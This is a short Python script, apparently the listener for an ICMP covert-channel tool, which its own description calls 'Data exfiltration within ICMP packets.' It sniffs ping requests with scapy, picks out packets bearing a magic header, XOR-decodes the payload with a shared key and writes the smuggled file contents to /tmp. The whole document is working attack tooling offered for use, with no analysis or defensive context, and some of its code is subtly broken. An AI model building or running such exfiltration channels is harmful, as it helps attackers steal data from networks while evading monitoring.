#!/usr/bin/env python3

from scapy.all import *
import random as rd
import string
import argparse as ap
from os import path


HEADER = b'XuV3'
FILEREP = '/tmp/'

def XORDecode(data):
    global key
    unxoreddata = b''.join(chr(charData ^ ord(key[idxData%len(key)])).encode('utf-8') for idxData, charData in enumerate(data))
    return unxoreddata

def startICMPSniffer(iface):
    print('Starting ICMP sniffer...')
    sniff(filter='icmp [icmptype] == 8', iface=iface, prn=receiveData)

def receiveData(packet):
    if packet.haslayer(ICMP) and packet.haslayer(Raw):
        raw = packet.getlayer(Raw).load
        header = raw[0:4]
        if header==HEADER:
           payload=XORDecode(raw[4::]).split(b':',1)
           fileName = FILEREP + os.path.basename(payload[0].decode('ASCII'))
           print("Receiving file %s" % fileName)
           with open(fileName,'ab') as f:
                f.write(payload[1])

def main():
    parser = ap.ArgumentParser(description="Data exfiltration within ICMP packets.")
    parser.add_argument('key', help='Encryption key to share with client')
    parser.add_argument('iface', help='The interface to listen on.')

    args = parser.parse_args()
    
    global key
    key = args.key
    startICMPSniffer(args.iface)

if __name__ == '__main__':
    main()
